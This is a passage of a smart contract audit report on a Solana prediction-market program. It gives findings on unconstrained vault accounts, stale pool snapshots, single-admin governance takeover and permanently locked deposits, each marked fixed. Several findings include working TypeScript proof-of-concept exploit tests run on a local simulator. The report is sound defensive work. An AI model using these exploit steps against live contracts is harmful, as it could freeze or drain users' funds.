creatorFeeVault: creatorFeeVaultPda,         userPosition: alicePosPda, treasury: treasury.publicKey,       }).signers(\[alice\]).rpc();     await warpTo(context, startTime \+ 10);     let burnError: any \= null;     try {       await program.methods.burnCreatorFees().accountsPartial({         admin: admin.publicKey, marketConfig: marketConfigPda,         event: eventPda, creatorFeeVault: creatorFeeVaultPda,         burnAddress: PublicKey.default,       }).signers(\[admin\]).rpc();     } catch (err) { burnError \= err; }     assert.match(String(burnError), /ConstraintMut/);   }); }); |
| :---- |

**Result:**  
creatorFeeVault.accumulated\_fees \= 40000 lamports

Error: AnchorError caused by account: burn\_address. Error Code: ConstraintMut.  
\[C-02b CONFIRMED\] burn\_creator\_fees is also unreachable.

**Recommendation**

**Short term:** Replace `BURN_ADDRESS` with the Solana incinerator address (`1nc1nerator11111111111111111111111111111111`), which is a valid writable account with no recoverable private key, and simultaneously implement proportional depositor refunds in `cancel_primary_event` rather than burning all vault funds.

**Long term:** Eliminate the burn-all cancel semantic entirely by tracking per-user primary contributions in `UserPosition` and routing cancel proceeds to a `claim_primary_refund` instruction, reserving burns exclusively for the creator's seed and fee vault.

## **High Severity Issues** {#high-severity-issues}

1. **Unbound Vault Enables Underpriced Market Freeze**  
   **Severity:** High  
   **File:** `programs/balr-market-rs/src/instructions/report_primary_event.rs` (lines 77–96)  
   **Status:** **FIXED**  
   **Description:**  
   Filing an invalidity report on a primary market requires the reporter to post a bond equal to 1% of the market's vault balance. The bond is calculated from a `vault` account provided by the caller, but the accounts struct applies no PDA seed constraint binding the vault to the reported event:  
   *// report\_primary\_event.rs — vault is unconstrained*  
   pub struct ReportPrimaryEvent\<'info\> {  
       pub event: Account\<'info, Event\>,   *// target event*  
       pub vault: Account\<'info, Vault\>,   *// ANY program-owned Vault accepted*  
       \#\[account(  
           init, payer \= reporter,  
           seeds \= \[b"review\_request", event.key().as\_ref()\], bump  
       )\]  
       pub review\_request: Account\<'info, ReviewRequest\>, *// correctly tied to event*  
   }  
     
   The `review_request` PDA is correctly seeded from `event.key()`, freezing the target market. But the bond is calculated from whichever vault the reporter supplies:  
   let pool\_lamports \= u64::try\_from(vault.lamport)?;  
   let bond\_lamports \= calc\_bond(pool\_lamports)?;  *// 1% of supplied vault, not target*  
     
   An attacker creates their own market (minimum seed: 0.5 SOL) to obtain a valid program-owned `Vault` with `lamport = 500_000_000`. By passing this small vault when reporting any target market, the attacker pays a bond of **0.005 SOL** regardless of the target pool's actual size. Compare this to `cancel_primary_event`, which correctly constrains the vault:  
   \#\[account(  
       mut,  
       seeds \= \[b"vault", event.creator.as\_ref(), \&hash\_question(\&event.question)\],  
       bump \= event.vault\_bump  
   )\]  
   pub vault: Account\<'info, Vault\>,  
     
   The omission in `report_primary_event` is a clear consistency gap in the account validation pattern.  
   **Impact:**  
   Any active primary market can be frozen for 0.005 SOL regardless of the target pool size. A single attacker-controlled vault can be reused to freeze an unlimited number of markets simultaneously with no per-market uniqueness constraint. The cost-to-harm ratio scales with the target pool: 10× reduction for a 0.5 SOL pool, 100× for a 5 SOL pool, 1000× for a 50 SOL pool. Combined with M-04 (report-delay trap), the effective cost of permanently locking a 5 SOL market is 0.005 SOL — a 1,000:1 harm ratio.  
   **Recommendation:**  
   **Short term:** Add PDA seed constraints to the `vault` account in `ReportPrimaryEvent` using the same seeds pattern already implemented in `cancel_primary_event`: `seeds = [b"vault", event.creator.as_ref(), &hash_question(&event.question)], bump = event.vault_bump`.

### 

2. **Stale Prize Pool Snapshot Causes Winner Payout Insolvency**  
   **Severity:** High  
   **File:** `instructions/settle_resolution_dispute.rs` (lines 45–65), `instructions/claim_win.rs` (lines 119–126)  
   **Status:** **FIXED**  
   **Description:**  
   When a resolution dispute is correctly upheld, `settle_resolution_dispute` pays the disputer a 0.5% reward from the vault. The instruction correctly reduces the vault's on-chain lamport balance and internal tracking field but does not update `event.primary_pool_lamports` — the snapshot taken at graduation:  
   *// settle\_resolution\_dispute.rs*  
   if reward\_lamports \> 0 {  
       vault.sub\_lamports(reward\_lamports)?;  
       ctx.accounts.requester.add\_lamports(reward\_lamports)?;  
       vault.lamport \= vault.lamport.checked\_sub(reward\_lamports as u128)?;  
       *// ⚠ event.primary\_pool\_lamports — NEVER updated*  
   }  
     
   All subsequent winner payout calculations read this stale snapshot:  
   *// claim\_win.rs*  
   let prize\_pool \= event.primary\_pool\_lamports;   *// still \= P (original)*  
   let payout \= (prize\_pool \* winning\_shares) / total\_winning\_shares;  
   vault.sub\_lamports(payout)?;                    *// fails when vault \< payout*  
     
   The total of all winner payouts is computed against `P` (original pool), but the vault holds `P − reward`. The last winning claimant by transaction order will have their `sub_lamports` call fail with insufficient funds, permanently losing their winnings. Every legitimate dispute settlement creates this deterministic deficit.

**Impact**

| Pool Size | Shortfall | Consequence |
| :---- | :---- | :---- |
| 6 SOL (minimum threshold) | 0.03 SOL | Last winner's claim reverts permanently |
| 50 SOL | 0.25 SOL | Last winner's claim reverts permanently |
| 100 SOL | 0.5 SOL | Last winner's claim reverts permanently |

The loss falls entirely on a single participant determined by claim transaction ordering. Because `claim_win` is blocked during dispute review, all winners are released simultaneously after settlement — creating an immediate on-chain race where slower participants bear the full loss. A malicious admin-disputer pair can weaponize this at zero net cost: file a dispute, settle in the disputer's favor, receive the 0.5% reward with bond refunded, extract from every market's winner pool on demand.

**Proof of Concept**

| import \* as anchor from "@coral-xyz/anchor"; import { BN, Program } from "@coral-xyz/anchor"; import { Keypair, PublicKey, LAMPORTS\_PER\_SOL } from "@solana/web3.js"; import { startAnchor, BankrunProvider } from "anchor-bankrun"; import { sha256 } from "js-sha256"; import { assert } from "chai"; import \* as fs from "fs"; import \* as path from "path"; const PROGRAM\_ID \= new PublicKey("BeC6CD5Y3PW6QtqVFBf1R1JLdw84QM7N4jqytBzxoPg4"); const IDL \= JSON.parse(fs.readFileSync(path.join(\_\_dirname, "../../target/idl/balr\_market.json"), "utf-8")); const hashQuestion \= (q: string) \=\> Buffer.from(sha256.array(Buffer.from(q, "utf-8"))); async function fund(ctx: any, to: PublicKey, lamports: number) {   const ix \= anchor.web3.SystemProgram.transfer({ fromPubkey: ctx.payer.publicKey, toPubkey: to, lamports });   const tx \= new anchor.web3.Transaction().add(ix);   tx.recentBlockhash \= ctx.lastBlockhash;   tx.feePayer \= ctx.payer.publicKey;   tx.sign(ctx.payer);   await ctx.banksClient.processTransaction(tx); } async function warpTo(ctx: any, unixTs: number) {   const clock \= await ctx.banksClient.getClock();   ctx.setClock(new (clock as any).constructor(     clock.slot, clock.epochStartTimestamp, clock.epoch,     clock.leaderScheduleEpoch, BigInt(unixTs))); } describe("H-02 PoC — dispute reward drains vault; snapshot diverges", () \=\> {   it("Post-settle vault.lamport \< event.primary\_pool\_lamports by exactly the reward", async () \=\> {     const context \= await startAnchor(path.join(\_\_dirname, "../.."), \[\], \[\]);     const provider \= new BankrunProvider(context);     anchor.setProvider(provider);     const program \= new Program(IDL as anchor.Idl, provider) as any;     const \[admin, treasury, relayer, creator, alice, bob, charlie\] \=       Array.from({ length: 7 }, () \=\> Keypair.generate());     for (const k of \[admin, creator, alice, bob, charlie\])       await fund(context, k.publicKey, 20 \* LAMPORTS\_PER\_SOL);     await program.methods.initialize(       \[admin.publicKey, admin.publicKey, admin.publicKey\],       relayer.publicKey, treasury.publicKey,       new BN(LAMPORTS\_PER\_SOL), new BN(0), new BN(200), new BN(150),       new BN(6 \* LAMPORTS\_PER\_SOL), new BN(1\_000\_000), 20,       new BN(2 \* LAMPORTS\_PER\_SOL),     ).accounts({ admin: admin.publicKey }).signers(\[admin\]).rpc();     const clock \= await context.banksClient.getClock();     const startTime \= Number(clock.unixTimestamp) \+ 60;     const endTime \= startTime \+ 300;     const resTime \= endTime \+ 60;     const question \= "H-02 dispute drain";     const qHash \= hashQuestion(question);     const \[marketConfigPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("market\_config")\], PROGRAM\_ID);     const \[eventPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("event"), creator.publicKey.toBuffer(), qHash\], PROGRAM\_ID);     const \[vaultPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("vault"), creator.publicKey.toBuffer(), qHash\], PROGRAM\_ID);     const \[creatorFeeVaultPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("creator\_fee\_vault"), eventPda.toBuffer()\], PROGRAM\_ID);     const \[creatorPosPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), creator.publicKey.toBuffer()\], PROGRAM\_ID);     const \[alicePosPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), alice.publicKey.toBuffer()\], PROGRAM\_ID);     const \[bobPosPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), bob.publicKey.toBuffer()\], PROGRAM\_ID);     const \[reviewPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("review\_request"), eventPda.toBuffer()\], PROGRAM\_ID);     await program.methods.createEvent(       new BN(startTime), new BN(endTime), new BN(resTime),       question, new BN(0.5 \* LAMPORTS\_PER\_SOL), true, "", \[\],     ).accountsPartial({       creator: creator.publicKey, marketConfig: marketConfigPda,       event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda,       creatorPosition: creatorPosPda, treasury: treasury.publicKey,     }).signers(\[creator\]).rpc();     for (let i \= 0; i \< 5; i++) {       let ev \= await program.account.event.fetch(eventPda);       if (ev.isGraduated) break;       await program.methods.primaryOrder({ yes: {} }, new BN(LAMPORTS\_PER\_SOL))         .accountsPartial({ user: alice.publicKey, marketConfig: marketConfigPda, event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda, userPosition: alicePosPda, treasury: treasury.publicKey })         .signers(\[alice\]).rpc();       ev \= await program.account.event.fetch(eventPda);       if (ev.isGraduated) break;       await program.methods.primaryOrder({ no: {} }, new BN(LAMPORTS\_PER\_SOL))         .accountsPartial({ user: bob.publicKey, marketConfig: marketConfigPda, event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda, userPosition: bobPosPda, treasury: treasury.publicKey })         .signers(\[bob\]).rpc();     }     const ev \= await program.account.event.fetch(eventPda);     const snapshot: bigint \= BigInt(ev.primaryPoolLamports.toString());     await warpTo(context, resTime \+ 10);     await program.methods.resolveEvent(true).accountsPartial({ oracle: relayer.publicKey, marketConfig: marketConfigPda, event: eventPda, vault: vaultPda }).signers(\[relayer\]).rpc();     await program.methods.disputeResolvedEvent(false).accountsPartial({ disputer: charlie.publicKey, event: eventPda, reviewRequest: reviewPda }).signers(\[charlie\]).rpc();     const vaultBefore \= await program.account.vault.fetch(vaultPda);     await program.methods.settleResolutionDispute(true).accountsPartial({ admin: admin.publicKey, marketConfig: marketConfigPda, event: eventPda, vault: vaultPda, reviewRequest: reviewPda, requester: charlie.publicKey, treasury: treasury.publicKey }).signers(\[admin\]).rpc();     const evAfter \= await program.account.event.fetch(eventPda);     const vaultAfter \= await program.account.vault.fetch(vaultPda);     const snapAfter: bigint \= BigInt(evAfter.primaryPoolLamports.toString());     const reward \= (snapshot \* BigInt(50)) / BigInt(10\_000);     assert.strictEqual(snapAfter.toString(), snapshot.toString()); *// snapshot unchanged*     assert.strictEqual((BigInt(vaultBefore.lamport.toString()) \- BigInt(vaultAfter.lamport.toString())).toString(), reward.toString());     assert.isTrue((snapAfter \- BigInt(vaultAfter.lamport.toString())) \> BigInt(0));   }); }); |
| :---- |

**Result:**

Graduated. primary\_pool\_lamports snapshot \= 6.5 SOL  
Post-settle: vault.lamport \= 6.4675 SOL  
Post-settle: event.primary\_pool\_lamports \= 6.5 SOL (UNCHANGED)  
\[H-02 CONFIRMED\] vault is short by 0.0325 SOL — last claiming winner will revert.

**Recommendation**

**Short term:** Decrement `event.primary_pool_lamports` by `reward_lamports` immediately after the vault deduction in `settle_resolution_dispute` so the payout snapshot stays consistent with the live vault balance.

**Long term:** Route the dispute reward from `market_config.treasury` rather than the prize pool vault, preserving the full `primary_pool_lamports` snapshot and eliminating winner shortfall entirely.

## 

## **Medium Severity Issues** {#medium-severity-issues}

1. **Insufficient Admin Quorum for Governance Mutations**  
   **Severity:** Medium  
   **File:** `programs/balr-market-rs/src/instructions/update_config.rs` (lines 23–35)  
   **Status:** **FIXED**  
   **Description:**  
   `update_config` — the single instruction that mutates all protocol-wide parameters — requires only one of three admin keys to sign and permits that sole signer to overwrite the entire admin array in the same transaction:  
   *// update\_config.rs — 1-of-3 quorum only*  
   require\!(  
       market\_config.admin.iter().any(|\&admin| admin \== signer),  
       ErrorCode::Unauthorized  
   );  
   if let Some(new\_admins) \= admins {  
       require\!(\!new\_admins.iter().all(|\&pk| pk \== Pubkey::default()), AdminEmpty);  
       market\_config.admin \= new\_admins;  *// full array overwrite, no continuity constraint*  
   }  
     
   A single compromised or malicious admin key can replace all three admin slots with attacker-controlled addresses in one transaction, permanently locking out the other two. No `ConfigChanged` event is emitted to enable off-chain detection.  
   **Impact:**  
   A successful self-takeover grants unilateral, irrevocable control over the treasury address, oracle (relayer) resolution authority, all fee parameters, the graduation threshold (enabling M-02 attack), and all dispute authority. The attack requires compromising only one of three keys — a single phishing event, leaked private key, or insider action. The 3-admin design implies meaningful multi-party governance; the implementation makes it a social guarantee only.  
     
   **Proof of Concept:**

|  import \* as anchor from "@coral-xyz/anchor"; import { BN, Program } from "@coral-xyz/anchor"; import { Keypair, PublicKey, LAMPORTS\_PER\_SOL } from "@solana/web3.js"; import { startAnchor, BankrunProvider } from "anchor-bankrun"; import { assert } from "chai"; import \* as fs from "fs"; import \* as path from "path"; const PROGRAM\_ID \= new PublicKey("BeC6CD5Y3PW6QtqVFBf1R1JLdw84QM7N4jqytBzxoPg4"); const IDL \= JSON.parse(fs.readFileSync(path.join(\_\_dirname, "../../target/idl/balr\_market.json"), "utf-8")); describe("M-01 PoC — single admin overwrites entire admin array", () \=\> {   it("admin\[0\] alone calls update\_config and locks out admin\[1\]/admin\[2\]", async () \=\> {     const context \= await startAnchor(path.join(\_\_dirname, "../.."), \[\], \[\]);     const provider \= new BankrunProvider(context);     anchor.setProvider(provider);     const program \= new Program(IDL as anchor.Idl, provider) as any;     const \[admin0, admin1, admin2, treasury, relayer\] \=       Array.from({ length: 5 }, () \=\> Keypair.generate());     const ix \= anchor.web3.SystemProgram.transfer({ fromPubkey: context.payer.publicKey, toPubkey: admin0.publicKey, lamports: 2 \* LAMPORTS\_PER\_SOL });     const tx \= new anchor.web3.Transaction().add(ix);     tx.recentBlockhash \= context.lastBlockhash;     tx.feePayer \= context.payer.publicKey;     tx.sign(context.payer);     await context.banksClient.processTransaction(tx);     await program.methods.initialize(       \[admin0.publicKey, admin1.publicKey, admin2.publicKey\],       relayer.publicKey, treasury.publicKey,       new BN(LAMPORTS\_PER\_SOL), new BN(0), new BN(200), new BN(150),       new BN(6 \* LAMPORTS\_PER\_SOL), new BN(1\_000\_000), 20,       new BN(2 \* LAMPORTS\_PER\_SOL),     ).accounts({ admin: admin0.publicKey }).signers(\[admin0\]).rpc();     const \[marketConfigPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("market\_config")\], PROGRAM\_ID);     const attacker \= Keypair.generate();     await program.methods.updateConfig(       \[attacker.publicKey, attacker.publicKey, attacker.publicKey\],       null, null, null, null, null, null, null, null, null, null,     ).accounts({ admin: admin0.publicKey }).signers(\[admin0\]).rpc();     const config \= await program.account.marketConfig.fetch(marketConfigPda);     for (const a of config.admin as PublicKey\[\])       assert.strictEqual(a.toBase58(), attacker.publicKey.toBase58());     assert.notInclude((config.admin as PublicKey\[\]).map(k \=\> k.toBase58()), admin1.publicKey.toBase58());     assert.notInclude((config.admin as PublicKey\[\]).map(k \=\> k.toBase58()), admin2.publicKey.toBase58());   }); }); |
| :---- |

   

   **Result:**  
   \[M-01 CONFIRMED\] admin\[0\] alone replaced the entire admin array — no quorum enforced.

     ✔ (40ms)

**Recommendation**

**Short term:** Require 2-of-3 admin co-signatures for mutations to the admin array, treasury, and relayer fields by validating additional signers passed via `remaining_accounts` against the current admin set.

**Long term:** Introduce a 24–48 hour timelock with veto capability for admin array changes, giving non-signing admins a window to observe and cancel unauthorized governance mutations.

2. **Retroactive Graduation Threshold Change Locks Live Markets**  
   **Severity:** Medium  
   **Files:** `instructions/update_config.rs`, `instructions/pimary_order.rs`, `states.rs`  
   **Status:** **FIXED**  
   **Description:**  
   The `graduation_threshold` — the minimum SOL required for a market to graduate to secondary trading — is stored only in the global `MarketConfig` and never snapshotted into individual `Event` accounts at creation. Every primary trade reads it live:  
   *// pimary\_order.rs — live read on every trade*  
   if event.should\_graduate(vault.lamport, market\_config.graduation\_threshold) { ... }  
     
   A single admin can raise `graduation_threshold` to an unreachable value at any time with immediate effect and no timelock, causing all in-progress markets to fail graduation before `start_time`. Once `start_time` passes, primary trading closes permanently and deposits enter the M-03 dead state with no recovery path.  
   **Impact:**  
   A single `update_config` transaction (\~0.000005 SOL) can simultaneously destroy every active primary market on the platform. All primary deposits accumulated across those markets become permanently inaccessible. At 10 active markets × 5.9 SOL average deposits, the loss is 59 SOL permanently locked for the cost of a single transaction fee.  
   **Recommendation**  
   **Short term:** Snapshot `graduation_threshold` into the `Event` struct at creation time and reference `event.graduation_threshold` in `pimary_order.rs`, grandfathering existing markets to their creation-time threshold.  
   **Long term:** Enforce an upper bound on `graduation_threshold` in `update_config` to prevent setting it to values that make existing markets permanently ungradable.

### 

3. **Absent Refund Path for Non-Graduated Primary Deposits**  
   **Severity:** Medium  
   **Files:** All instructions — no instruction addresses this state  
   **Status:** **FIXED**  
   **Description:**  
   A standard market enters a terminal dead state when it reaches `start_time` without satisfying the graduation condition. This occurs through two independent mechanisms:  
   **Trigger A — Insufficient lamports:** The vault does not accumulate `graduation_threshold` SOL before `start_time`.  
   **Trigger B — One-sided share distribution:** The graduation guard requires both `total_yes_shares >= 1` AND `total_no_shares >= 1`. A market where all primary buyers choose the same outcome — realistic for markets with a consensus-favored result — never graduates regardless of how much SOL was deposited:  
   *// states.rs*  
   pub fn should\_graduate(\&self, vault\_lamports: u128, graduation\_threshold: u128) \-\> bool {  
       vault\_lamports \>= graduation\_threshold  
           && self.total\_yes\_shares \>= 1  
           && self.total\_no\_shares \>= 1  
   }  
     
   Once `start_time` passes, every withdrawal path is permanently blocked:

| Instruction | Failure reason |
| :---- | :---- |
| `primary_order` | `clock >= primary_phase_end()` → `EventHasEnded` |
| `resolve_event` | `require!(event.is_graduated)` → `MarketNotGraduated` |
| `secondary_limit_order` | `require!(event.is_graduated)` → `MarketNotSecondary` |
| `claim_winnings` | `require!(event.is_resolved)` → `NotResolved` |
| `claim_lamports` | `position.lamports` never credited in primary flow |
| `report_primary_event` | `clock < primary_phase_end` → `EventHasEnded` |

   There is no `refund_primary_deposit` instruction. Primary depositors have no on-chain recourse.

   **Proof of Concept:**

| import \* as anchor from "@coral-xyz/anchor"; import { BN, Program } from "@coral-xyz/anchor"; import { Keypair, PublicKey, LAMPORTS\_PER\_SOL } from "@solana/web3.js"; import { startAnchor, BankrunProvider } from "anchor-bankrun"; import { sha256 } from "js-sha256"; import { assert, expect } from "chai"; import \* as fs from "fs"; import \* as path from "path"; const PROGRAM\_ID \= new PublicKey("BeC6CD5Y3PW6QtqVFBf1R1JLdw84QM7N4jqytBzxoPg4"); const IDL \= JSON.parse(fs.readFileSync(path.join(\_\_dirname, "../../target/idl/balr\_market.json"), "utf-8")); const hashQuestion \= (q: string) \=\> Buffer.from(sha256.array(Buffer.from(q, "utf-8"))); async function fund(ctx: any, to: PublicKey, lamports: number) {   const ix \= anchor.web3.SystemProgram.transfer({ fromPubkey: ctx.payer.publicKey, toPubkey: to, lamports });   const tx \= new anchor.web3.Transaction().add(ix);   tx.recentBlockhash \= ctx.lastBlockhash;   tx.feePayer \= ctx.payer.publicKey;   tx.sign(ctx.payer);   await ctx.banksClient.processTransaction(tx); } async function warpTo(ctx: any, unixTs: number) {   const clock \= await ctx.banksClient.getClock();   ctx.setClock(new (clock as any).constructor(     clock.slot, clock.epochStartTimestamp, clock.epoch,     clock.leaderScheduleEpoch, BigInt(unixTs))); } describe("M-03 — one-sided Standard market locks vault forever", () \=\> {   it("Vault locked: graduation never fires, every withdraw path reverts", async () \=\> {     const context \= await startAnchor(path.join(\_\_dirname, "../.."), \[\], \[\]);     const provider \= new BankrunProvider(context);     anchor.setProvider(provider);     const program \= new Program(IDL as anchor.Idl, provider) as any;     const \[admin, treasury, relayer, creator, alice\] \=       Array.from({ length: 5 }, () \=\> Keypair.generate());     for (const k of \[admin, creator, alice\])       await fund(context, k.publicKey, 20 \* LAMPORTS\_PER\_SOL);     await program.methods.initialize(       \[admin.publicKey, admin.publicKey, admin.publicKey\],       relayer.publicKey, treasury.publicKey,       new BN(LAMPORTS\_PER\_SOL), new BN(0), new BN(200), new BN(150),       new BN(6 \* LAMPORTS\_PER\_SOL), new BN(1\_000\_000), 20,       new BN(2 \* LAMPORTS\_PER\_SOL),     ).accounts({ admin: admin.publicKey }).signers(\[admin\]).rpc();     const clock \= await context.banksClient.getClock();     const startTime \= Number(clock.unixTimestamp) \+ 120;     const question \= "one-sided stuck vault";     const qHash \= hashQuestion(question);     const \[marketConfigPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("market\_config")\], PROGRAM\_ID);     const \[eventPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("event"), creator.publicKey.toBuffer(), qHash\], PROGRAM\_ID);     const \[vaultPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("vault"), creator.publicKey.toBuffer(), qHash\], PROGRAM\_ID);     const \[creatorFeeVaultPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("creator\_fee\_vault"), eventPda.toBuffer()\], PROGRAM\_ID);     const \[creatorPosPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), creator.publicKey.toBuffer()\], PROGRAM\_ID);     const \[alicePosPda\] \= PublicKey.findProgramAddressSync(\[Buffer.from("position"), eventPda.toBuffer(), alice.publicKey.toBuffer()\], PROGRAM\_ID);     await program.methods.createEvent(       new BN(startTime), new BN(startTime \+ 3600), new BN(startTime \+ 7200),       question, new BN(0.5 \* LAMPORTS\_PER\_SOL), true */\* seed\_yes\_side \*/*, "", \[\],     ).accountsPartial({       creator: creator.publicKey, marketConfig: marketConfigPda,       event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda,       creatorPosition: creatorPosPda, treasury: treasury.publicKey,     }).signers(\[creator\]).rpc();     for (let i \= 0; i \< 7; i++) {       const ev \= await program.account.event.fetch(eventPda);       assert.isFalse(ev.isGraduated);       try {         await program.methods.primaryOrder({ yes: {} }, new BN(LAMPORTS\_PER\_SOL))           .accountsPartial({ user: alice.publicKey, marketConfig: marketConfigPda, event: eventPda, vault: vaultPda, creatorFeeVault: creatorFeeVaultPda, userPosition: alicePosPda, treasury: treasury.publicKey })           .signers(\[alice\]).rpc();       } catch { break; }     }     await warpTo(context, startTime \+ 10);     let rErr: any \= null;     try {       await program.methods.resolveEvent(true).accountsPartial({ oracle: relayer.publicKey, marketConfig: marketConfigPda, event: eventPda, vault: vaultPda }).signers(\[relayer\]).rpc();     } catch (e) { rErr \= e; }     expect(String(rErr)).to.match(/MarketNotGraduated/);     const finalVault \= await program.account.vault.fetch(vaultPda);     assert.isAbove(Number(finalVault.lamport), 0);   }); }); |
| :---- |

   

   

   

   **Result:**  
   Final state: vault.lamport \= 1.5 SOL LOCKED

     resolve\_event    → MarketNotGraduated

     primary\_order    → EventHasEnded

     secondary\_order  → MarketNotSecondary

     \[M-03 CONFIRMED\] 1.5 SOL permanently locked.

     ✔ (54ms)

   

   **Recommendation**

   **Short term:** Implement a `refund_primary_deposit` instruction gated on `!event.is_graduated && clock >= event.primary_phase_end()`, computing each user's refund proportionally from their share balance relative to total shares issued.

   **Long term:** Require the market creator to post shares on both sides at `create_event` — even a single dust share on the non-seeded side — so the two-sided graduation condition is always satisfiable from market inception.

### 

4. **Time-Delayed Report Freeze Converts to Permanent Fund Lockup**  
   **Severity:** Medium  
   **Files:** `instructions/approve_primary_event.rs`, `instructions/report_primary_event.rs`  
   **Status:** **FIXED**  
   **Description:**  
   `approve_primary_event` — the admin instruction that rejects a false invalidity report and unfreezes a market — contains no check on whether `start_time` has already passed. An attacker files `report_primary_event` close to `start_time`, freezing the market. If the admin correctly approves the false report after `start_time` has elapsed, `pending_review` is cleared but primary trading can never resume — `pimary_order` is gated by `clock < event.primary_phase_end()`. The market enters the M-03 dead state with all primary deposits permanently locked, despite no legitimate invalidity. Combined with H-01, the cost of this attack is 0.005 SOL.  
   **Impact:**  
   Any primary market can be permanently destroyed for 0.005 SOL if the attacker correctly times the freeze window against admin response latency. The attack is probabilistic — success probability increases with admin response time variance, making it reliable during weekends, holidays, or multi-timezone team operations. At 0.005 SOL per attempt against a 5 SOL market, the expected value is strongly positive for any attacker with knowledge of admin response patterns.  
   **Recommendation**  
   **Short term:** In `approve_primary_event`, extend `event.start_time` forward by the review duration when approval occurs after `start_time` has passed, preserving the full intended primary trading window: `event.start_time += clock.unix_timestamp - review_request.requested_at`.  
   **Long term:** Implement a maximum review duration in `MarketConfig` that auto-expires `pending_review` and restores normal market operation without admin action, eliminating both this attack vector and M-07 simultaneously.

### 

5. One-Sided Breaking Market Graduation Locks Primary Pool  
   **Severity:** Medium  
   **Files:** `states.rs` (`should_graduate_breaking`, `graduate_breaking_if_ready`), `instructions/resolve_event.rs`, `instructions/claim_win.rs`  
   **Status:** **FIXED**  
   **Description:**  
   Breaking markets graduate on a pure time trigger with no share balance requirement:  
   *// states.rs — no two-sided check*  
   pub fn should\_graduate\_breaking(\&self, clock\_ts: i64) \-\> bool {  
       self.market\_type \== MarketType::Breaking && clock\_ts \>= self.flash\_acquisition\_end  
   }  
     
   If only one side received participation during the flash acquisition window (3–15 minutes), the market graduates and snapshots `primary_pool_lamports` — but `total_winning_shares = 0` for the zero-participation side. If the market resolves in favor of that side, every `claim_winnings` call fails:  
   *// claim\_win.rs*  
   require\!(total\_winning\_shares \> 0, ErrorCode::InvalidShares);  *// reverts for every winner*  
     
   All `primary_pool_lamports` are permanently locked with no disposal path.  
   **Impact:**  
   One-sided participation is a realistic outcome for breaking markets with short flash windows, newly launched markets, or markets during low-activity periods. A creator who seeds YES and receives zero NO-side participation finds their 0.5+ SOL seed permanently locked if the market resolves NO. The vulnerability scales with market TVL and is especially likely during the protocol's early days when liquidity depth is shallow.  
   **Recommendation**  
   **Short term:** Add `&& self.total_yes_shares >= 1 && self.total_no_shares >= 1` to `should_graduate_breaking`, and transition one-sided markets to a refundable cancelled state at `flash_acquisition_end` instead of graduation.  
   **Long term:** Require the breaking market creator to post shares on both sides at `create_breaking_event` to guarantee the two-sided condition from inception.  
6. **Admin Cancel Destroys User Deposits Without Recourse**  
   **Severity:** Medium  
   **File:** `instructions/cancel_primary_event.rs` (lines 35–42)  
   **Status:** **FIXED**  
   **Description:**  
   When `cancel_primary_event` executes (post C-02 fix), it drains the **entire vault balance** to the burn address indiscriminately:  
   let burned\_pool\_lamports \= u64::try\_from(vault.lamport)?;  
   if burned\_pool\_lamports \> 0 {  
       vault.sub\_lamports(burned\_pool\_lamports)?;     *// empties vault entirely*  
       ctx.accounts.burn\_address.add\_lamports(burned\_pool\_lamports)?;  
       vault.lamport \= 0;  
   }  
     
   `vault.lamport` contains every primary depositor's contribution alongside the creator's seed. All user deposits are burned with no refund mechanism. Combined with M-01 (single-admin array overwrite), a single compromised key can cancel any reviewed market and destroy all user deposits at transaction-fee cost.  
   **Impact:**  
   Upon C-02 remediation without addressing this issue, all primary deposits in any market under `PrimaryInvalidity` review become burnable by a single admin action. The reporter's bond is refunded on cancel, meaning reporters bear zero financial consequence for false reports — creating a perverse incentive where any actor willing to pay the 0.005 SOL bond (via H-01) and coordinate with a compromised admin can destroy any market's deposits for essentially no cost.

   **Recommendation**  
   **Short term:** Before deploying any C-02 fix, ensure the corrected `cancel_primary_event` burns only the creator's initial seed and `CreatorFeeVault` balance, while making all other user deposits claimable via a new `claim_primary_refund` instruction gated on `event.is_cancelled`.  
   **Long term:** Track per-user primary contributions in `UserPosition.primary_contributed_lamports` at the point of `primary_order` to enable proportional refund accounting without requiring share-based approximations.  
7. **Unbounded Review Duration Enables Indefinite Market Freeze**  
   **Severity:** Medium  
   **Files:** `instructions/report_primary_event.rs`, `instructions/dispute_resolved_event.rs`  
   **Status:** **FIXED**  
   **Description:**  
   Both review types (`PrimaryInvalidity` and `ResolutionDispute`) have no maximum duration enforced on-chain. A `PrimaryInvalidity` review blocks all primary trading; a `ResolutionDispute` review blocks all winner claims. The only entities with authority to resolve either review are the three admins. If admin keys are lost, the team is dissolved, or admins are operationally unavailable, all markets with pending reviews are frozen permanently with no on-chain fallback.  
   **Impact:**  
   Admin unavailability for any reason — key loss, team dissolution, legal action, jurisdiction seizure — permanently freezes all markets carrying pending reviews. Primary depositors and winning claimants alike are fully exposed to admin operational continuity risk with no time-bounded guarantee of resolution.  
   **Recommendation**  
   **Short term:** Add `max_review_duration_seconds` to `MarketConfig` and auto-clear `pending_review` in any instruction that reads it when `clock.unix_timestamp - review_request.requested_at > max_review_duration_seconds`, treating expired reviews as rejected with the reporter's bond sent to treasury.

### 

8. **Early Claim Sequence Amplifies Dispute Shortfall**  
   **Severity:** Medium  
   **Files:** `instructions/claim_win.rs`, `instructions/settle_resolution_dispute.rs`  
   **Status:** **FIXED**  
   **Description:**  
